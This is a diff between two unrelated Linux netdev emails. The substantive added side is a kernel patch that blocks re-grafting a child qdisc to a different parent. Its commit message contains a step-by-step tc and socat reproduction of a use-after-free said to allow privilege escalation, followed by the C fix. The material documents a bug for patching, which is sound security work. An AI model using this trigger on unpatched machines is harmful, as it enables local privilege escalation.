@@ -1,161 +1,211 @@
-Return-Path: <netdev+bounces-156708-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-156709-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
-	by mail.lfdr.de (Postfix) with ESMTPS id 9A981A07908
-	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 15:20:54 +0100 (CET)
+Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
+	by mail.lfdr.de (Postfix) with ESMTPS id 25691A0790F
+	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 15:22:10 +0100 (CET)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id C85E73A1C35
-	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 14:20:48 +0000 (UTC)
+	by am.mirrors.kernel.org (Postfix) with ESMTPS id BE84F1882D35
+	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 14:22:12 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id CAE1921A428;
-	Thu,  9 Jan 2025 14:20:48 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id A1E3421A428;
+	Thu,  9 Jan 2025 14:21:58 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=quicinc.com header.i=@quicinc.com header.b="SV6LaR5w"
+	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="2yQswHZr"
 X-Original-To: netdev@vger.kernel.org
-Received: from mx0a-0031df01.pphosted.com (mx0a-0031df01.pphosted.com [205.220.168.131])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-qv1-f48.google.com (mail-qv1-f48.google.com [209.85.219.48])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 41338218EB8;
-	Thu,  9 Jan 2025 14:20:47 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=205.220.168.131
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 74862290F
+	for <netdev@vger.kernel.org>; Thu,  9 Jan 2025 14:21:56 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.48
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1736432448; cv=none; b=Bb9izA2Do2kTWGjROIY9LCb1TWsb+jqle4qHD3coBd7Yzhe04pwG32nLczl2OxmyBgZlg2x9kdu3ja3N9BAHv9gUDN2pG1hJ2akMH3isO6c7S2EnGjFutoevTBGG4aF7DUvXPRlQ+aeFyFFiWyS3uewIHgeQKgJz753BRNeMShc=
+	t=1736432518; cv=none; b=DHPWQFOACOqONiir9QNWmkTg7qNLFYq2Mwf44DNW3MB+KJZaOqSMJ68iII/7GgP0oA3WRc4SNh+QBuJqupwGFKqdrVhCTykjpr0YOihGjwl7pyO/NQStDMqxRlBcnKmgTLlnEJEMTTY41kDR//uymjVmjh4n4nQPrbIE4Oz5X50=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1736432448; c=relaxed/simple;
-	bh=WQjgZPH0AX+r0bQdBP6/Y6y/hdKrBgENkNFq/e4ZkX0=;
-	h=Message-ID:Date:MIME-Version:Subject:To:CC:References:From:
-	 In-Reply-To:Content-Type; b=tHT7uCa/cGcea36+VP/6bjpJyU/AtpY/xB73IbY4EOALnxo/RMt80ZcvlwVqv+d56R92tY0lz4TS/P4azRugle+ki6vPL8mOIYjIHt2TH5EuNSZoyQynRpsQBx3i7INUM3joFJazCCIKL6zOHmQAc9X1ljHzNuZyb1jrNE8la/Y=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=quicinc.com; spf=pass smtp.mailfrom=quicinc.com; dkim=pass (2048-bit key) header.d=quicinc.com header.i=@quicinc.com header.b=SV6LaR5w; arc=none smtp.client-ip=205.220.168.131
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=quicinc.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=quicinc.com
-Received: from pps.filterd (m0279865.ppops.net [127.0.0.1])
-	by mx0a-0031df01.pphosted.com (8.18.1.2/8.18.1.2) with ESMTP id 509D8cIa011816;
-	Thu, 9 Jan 2025 14:20:31 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=quicinc.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=qcppdkim1; bh=
-	hEe2dSpPExObbK1eKe6egzm4w5xoz+xHc6bfmDSlRb0=; b=SV6LaR5wDsxnyshp
-	yBmFXI5z9CoKoO0puy9vT1yfeEGMGtF55Wry8ZwdL/WVcNAzyNWtNIdlYBXtacrK
-	uqSN3W/XDtEjOKrxRIhOisu7fNbAlM4x+ODy+kcz3aLelNpmTc35kMhUpAodWodu
-	TbWcvikVBr4Gr54GJo9HQlY5d3y6hXUPedgPryxSwWVJgKt+jMUE3fh26osodF8l
-	dxCGtclBnzZbwFT8Bc+u9GtkdRxp+qn4xZYYpHzw+ojeGFQwFuMGZ8g04AfZrGpp
-	eq+GTZEzCEdAML8p+SNEdWwN7FFkVe56pOXveyQyA2YeAC3tA5CKlrf8ljBFtbgy
-	/JBO0w==
-Received: from nasanppmta04.qualcomm.com (i-global254.qualcomm.com [199.106.103.254])
-	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 442f2kr5mb-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Thu, 09 Jan 2025 14:20:31 +0000 (GMT)
-Received: from nasanex01b.na.qualcomm.com (nasanex01b.na.qualcomm.com [10.46.141.250])
-	by NASANPPMTA04.qualcomm.com (8.18.1.2/8.18.1.2) with ESMTPS id 509EKUnK031250
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Thu, 9 Jan 2025 14:20:30 GMT
-Received: from [10.253.12.10] (10.80.80.8) by nasanex01b.na.qualcomm.com
- (10.46.141.250) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.1544.9; Thu, 9 Jan 2025
- 06:20:24 -0800
-Message-ID: <05e04632-5d79-4f07-bf29-a49c86910d6e@quicinc.com>
-Date: Thu, 9 Jan 2025 22:20:22 +0800
+	s=arc-20240116; t=1736432518; c=relaxed/simple;
+	bh=1UjWelzK9ldPeBVoIR+ZG4VTv9xbDkpVFFxmbxBetJY=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=Ml3HFoLRjFGqdFdEkAFFULwJnJ/VUkkPgpQjv0ik7r4uhNJGVg/XrZxmxk/67UeufQ7RD0o4K4zu5Vm+L5C8yjh6PVsZ9FQh8Qqsgl0I09dSOjpztNLFUh5KrbfhBBhLtLxXVZvS4DjqFB0ka7YND52IiHsjXd3SXHO7y2mOHQ0=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=2yQswHZr; arc=none smtp.client-ip=209.85.219.48
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
+Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
+Received: by mail-qv1-f48.google.com with SMTP id 6a1803df08f44-6dcc42b5e30so11194336d6.1
+        for <netdev@vger.kernel.org>; Thu, 09 Jan 2025 06:21:56 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1736432515; x=1737037315; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to;
+        bh=i3V9sPefjb+hwddJZRGj0VSg2JfdeejyXhsqvhZ8HSY=;
+        b=2yQswHZr3Skm7cW6vcds/+VGm5hPgRMeOIy6orX3JDDuVXMYdK0iLyRHKazY05hIlq
+         73MlOvGn03lndfs/9cYDgJe0Km+dAWYQn1GD70SaRqobPVimTbcgy/nPN0I+iWEhDji0
+         fsWDzpmC5/8R8tNkkkzCSUWvB1I77Sxya34HexVhe7ka4Giz23R6fihkkai6f/Y9SDCc
+         7SFZVc6Tqv/T9s+xLfDW8qmv+sC0ePztgZuCQQ7NPKUONdDLNdeqW0kGwTH0Mc5bJgZS
+         Pg0ZGrmAkFye4EpNOZArjzE+Z0D5+G3gEUwAY2JfP5xVjUou+NaewNexQJ/p+DSRYg8g
+         NfUg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1736432515; x=1737037315;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to;
+        bh=i3V9sPefjb+hwddJZRGj0VSg2JfdeejyXhsqvhZ8HSY=;
+        b=aNabZfQOdOwnypuZILt58BVpq5Pm/BQhS5gJK41GYyjjbf+rGyjMnV5Vs9m5Oej3Sk
+         g/WqYzWosn+C1OF67gQw02WZ3ub0Dc+yJR2wOWhE51X26T9ogao0+8uyLTG5iYmbFcTi
+         RMRXqWPC/Yh/8R1l4KAAzRN3EFJph1PLInmHNzqx2xJu+5e0q/gSG2GhweVkyTrGtzRZ
+         EwY4ZgKzRE0p2WrYEDFiPxXxl012+2vbjjTf7gDoXv5on+4keMq/zrA4xEk8TGrcD1T8
+         Y2msAvHiaIC4jAYy2UXmO3YaWFaBWssQSAhEHhjJBymwRZqxiHrjBHPvcZz6ball7eiA
+         IQjA==
+X-Gm-Message-State: AOJu0YyEWSQr/Z1CjUPTAhu8k8b9klDb25l3nJooj6C2kQkY/hkqld1b
+	uNKM+t2oHPb6t+5SNWpU3/TsE1kKg1rIP41MRywAaTvsmEBZFyyrTpK+N2G15tESbyN2bNPANJY
+	=
+X-Gm-Gg: ASbGncstnNXEaqlfFZAtH2tDQv6Kp2mPiMCoGw5HLmGediW+uJPooYUjbSPAfoiRW8x
+	X+b+nuj3q2XaCep/tUM9CaBO01WJixvWTC9t1uo67R+7YfEO0XYRNr9Ut6XbqH93PnYHfFfxRF2
+	xA3MLNVg/aDp+CxFO90wvHWCA28OjsttziknvfF3eNr8Z7LgOaJ/hyUOiE3Xk457dHvRFZRhegG
+	FKRE/m6npGpJYjypLWgz6HkUgWoPIayX+3rKTvazcfcOAfN
+X-Google-Smtp-Source: AGHT+IEorflohHFJSutQCmhLNUfVJ7COjkmK9POTBJAV/IVa2EBwjpMMrLuV428NEyg6/uQHET1vTQ==
+X-Received: by 2002:a05:6214:3289:b0:6d8:ab3c:5e8 with SMTP id 6a1803df08f44-6df9b2b31c2mr114048526d6.29.1736432514899;
+        Thu, 09 Jan 2025 06:21:54 -0800 (PST)
+Received: from majuu.waya ([76.64.65.230])
+        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-6dd180ea82fsm201328966d6.26.2025.01.09.06.21.53
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 09 Jan 2025 06:21:54 -0800 (PST)
+From: Jamal Hadi Salim <jhs@mojatatu.com>
+To: netdev@vger.kernel.org
+Cc: jiri@resnulli.us,
+	xiyou.wangcong@gmail.com,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	nnamrec@gmail.com
+Subject: [PATCH net 1/1] net: sched: Disallow replacing of child qdisc from one parent to another
+Date: Thu,  9 Jan 2025 09:21:43 -0500
+Message-Id: <20250109142143.26084-1-jhs@mojatatu.com>
+X-Mailer: git-send-email 2.34.1
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net-next v2 07/14] net: ethernet: qualcomm: Initialize PPE
- queue settings
-To: Christophe JAILLET <christophe.jaillet@wanadoo.fr>,
-        Andrew Lunn
-	<andrew+netdev@lunn.ch>,
-        "David S. Miller" <davem@davemloft.net>,
-        "Eric
- Dumazet" <edumazet@google.com>,
-        Jakub Kicinski <kuba@kernel.org>, Paolo Abeni
-	<pabeni@redhat.com>,
-        Rob Herring <robh@kernel.org>,
-        Krzysztof Kozlowski
-	<krzk+dt@kernel.org>,
-        Conor Dooley <conor+dt@kernel.org>, Lei Wei
-	<quic_leiwei@quicinc.com>,
-        Suruchi Agarwal <quic_suruchia@quicinc.com>,
-        Pavithra R <quic_pavir@quicinc.com>, Simon Horman <horms@kernel.org>,
-        Jonathan Corbet <corbet@lwn.net>, Kees Cook <kees@kernel.org>,
-        "Gustavo A. R.
- Silva" <gustavoars@kernel.org>,
-        Philipp Zabel <p.zabel@pengutronix.de>
-CC: <linux-arm-msm@vger.kernel.org>, <netdev@vger.kernel.org>,
-        <devicetree@vger.kernel.org>, <linux-kernel@vger.kernel.org>,
-        <linux-doc@vger.kernel.org>, <linux-hardening@vger.kernel.org>,
-        <quic_kkumarcs@quicinc.com>, <quic_linchen@quicinc.com>,
-        <srinivas.kandagatla@linaro.org>, <bartosz.golaszewski@linaro.org>,
-        <john@phrozen.org>
-References: <20250108-qcom_ipq_ppe-v2-0-7394dbda7199@quicinc.com>
- <20250108-qcom_ipq_ppe-v2-7-7394dbda7199@quicinc.com>
- <4916d329-4513-46e1-ac1c-34628f335dde@wanadoo.fr>
-Content-Language: en-US
-From: Jie Luo <quic_luoj@quicinc.com>
-In-Reply-To: <4916d329-4513-46e1-ac1c-34628f335dde@wanadoo.fr>
-Content-Type: text/plain; charset="UTF-8"; format=flowed
 Content-Transfer-Encoding: 8bit
-X-ClientProxiedBy: nasanex01a.na.qualcomm.com (10.52.223.231) To
- nasanex01b.na.qualcomm.com (10.46.141.250)
-X-QCInternal: smtphost
-X-Proofpoint-Virus-Version: vendor=nai engine=6200 definitions=5800 signatures=585085
-X-Proofpoint-GUID: Th-8zKUQAxnJm7Q40eHqq-IqUg5sTjAP
-X-Proofpoint-ORIG-GUID: Th-8zKUQAxnJm7Q40eHqq-IqUg5sTjAP
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1039,Hydra:6.0.680,FMLib:17.12.60.29
- definitions=2024-09-06_09,2024-09-06_01,2024-09-02_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0 priorityscore=1501
- adultscore=0 mlxlogscore=968 clxscore=1015 lowpriorityscore=0
- impostorscore=0 spamscore=0 phishscore=0 bulkscore=0 malwarescore=0
- suspectscore=0 mlxscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.19.0-2411120000 definitions=main-2501090115
 
+Lion Ackermann was able to create a UAF which can be abused for privilege
+escalation with the following script
 
+Step 1. create root qdisc
+tc qdisc add dev lo root handle 1:0 drr
 
-On 1/9/2025 3:29 AM, Christophe JAILLET wrote:
-> Le 08/01/2025 à 14:47, Luo Jie a écrit :
->> Configure unicast and multicast hardware queues for the PPE
->> ports to enable packet forwarding between the ports.
->>
->> Each PPE port is assigned with a range of queues. The queue ID
->> selection for a packet is decided by the queue base and queue
->> offset that is configured based on the internal priority and
->> the RSS hash value of the packet.
->>
->> Signed-off-by: Luo Jie <quic_luoj@quicinc.com>
-> 
-> ...
-> 
->> +        /* Initialize the queue offset of RSS hash as 0 to avoid the
->> +         * random hardware value that will lead to the unexpected
->> +         * destination queue generated.
->> +         */
->> +        index = 0;
-> 
-> Useless.
+step2. a class for packet aggregation do demonstrate uaf
+tc class add dev lo classid 1:1 drr
 
-Will remove it.
+step3. a class for nesting
+tc class add dev lo classid 1:2 drr
 
-> 
->> +        for (index = 0; index < PPE_QUEUE_HASH_NUM; index++) {
->> +            ret = ppe_queue_ucast_offset_hash_set(ppe_dev, port_id,
->> +                                  index, 0);
->> +            if (ret)
->> +                return ret;
->> +        }
->> +    }
->> +
->> +    return 0;
->> +}
-> 
-> ...
-> 
-> CJ
-> 
+step4. a class to graft qdisc to
+tc class add dev lo classid 1:3 drr
+
+step5.
+tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024
+
+step6.
+tc qdisc add dev lo parent 1:2 handle 3:0 drr
+
+step7.
+tc class add dev lo classid 3:1 drr
+
+step 8.
+tc qdisc add dev lo parent 3:1 handle 4:0 pfifo
+
+step 9. Display the class/qdisc layout
+
+tc class ls dev lo
+ class drr 1:1 root leaf 2: quantum 64Kb
+ class drr 1:2 root leaf 3: quantum 64Kb
+ class drr 3:1 root leaf 4: quantum 64Kb
+
+tc qdisc ls
+ qdisc drr 1: dev lo root refcnt 2
+ qdisc plug 2: dev lo parent 1:1
+ qdisc pfifo 4: dev lo parent 3:1 limit 1000p
+ qdisc drr 3: dev lo parent 1:2
+
+step10. trigger the bug <=== prevented by this patch
+tc qdisc replace dev lo parent 1:3 handle 4:0
+
+step 11. Redisplay again the qdiscs/classes
+
+tc class ls dev lo
+ class drr 1:1 root leaf 2: quantum 64Kb
+ class drr 1:2 root leaf 3: quantum 64Kb
+ class drr 1:3 root leaf 4: quantum 64Kb
+ class drr 3:1 root leaf 4: quantum 64Kb
+
+tc qdisc ls
+ qdisc drr 1: dev lo root refcnt 2
+ qdisc plug 2: dev lo parent 1:1
+ qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
+ qdisc drr 3: dev lo parent 1:2
+
+Observe that a) parent for 4:0 does not change despite the replace request.
+There can only be one parent.  b) refcount has gone up by two for 4:0 and
+c) both class 1:3 and 3:1 are pointing to it.
+
+Step 12.  send one packet to plug
+echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
+step13.  send one packet to the grafted fifo
+echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))
+
+step14. lets trigger the uaf
+tc class delete dev lo classid 1:3
+tc class delete dev lo classid 1:1
+
+The semantics of "replace" is for a del/add _on the same node_ and not
+a delete from one node(3:1) and add to another node (1:3) as in step10.
+While we could "fix" with a more complex approach there could be
+consequences to expectations so the patch takes the preventive approach of
+"disallow such config".
+
+Joint work with Lion Ackermann <nnamrec@gmail.com>
+
+Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
+---
+ net/sched/sch_api.c | 8 +++++++-
+ 1 file changed, 7 insertions(+), 1 deletion(-)
+
+diff --git a/net/sched/sch_api.c b/net/sched/sch_api.c
+index 300430b8c4d2..e162a1b31173 100644
+--- a/net/sched/sch_api.c
++++ b/net/sched/sch_api.c
+@@ -1612,7 +1612,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
+ 	struct nlattr *tca[TCA_MAX + 1];
+ 	struct net_device *dev;
+ 	u32 clid;
+-	struct Qdisc *q, *p;
++	struct Qdisc *leaf_q, *q, *p;
+ 	int err;
+ 
+ replay:
+@@ -1640,6 +1640,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
+ 					return -ENOENT;
+ 				}
+ 				q = qdisc_leaf(p, clid);
++				leaf_q = q;
+ 			} else if (dev_ingress_queue_create(dev)) {
+ 				q = rtnl_dereference(dev_ingress_queue(dev)->qdisc_sleeping);
+ 			}
+@@ -1673,6 +1674,11 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
+ 					NL_SET_ERR_MSG(extack, "Invalid qdisc name");
+ 					return -EINVAL;
+ 				}
++				if (leaf_q && leaf_q->parent != q->parent) {
++					NL_SET_ERR_MSG(extack, "Invalid Parent for operation");
++					return -EINVAL;
++				}
++
+ 				if (q->flags & TCQ_F_INGRESS) {
+ 					NL_SET_ERR_MSG(extack,
+ 						       "Cannot regraft ingress or clsact Qdiscs");
+-- 
+2.34.1
 
 
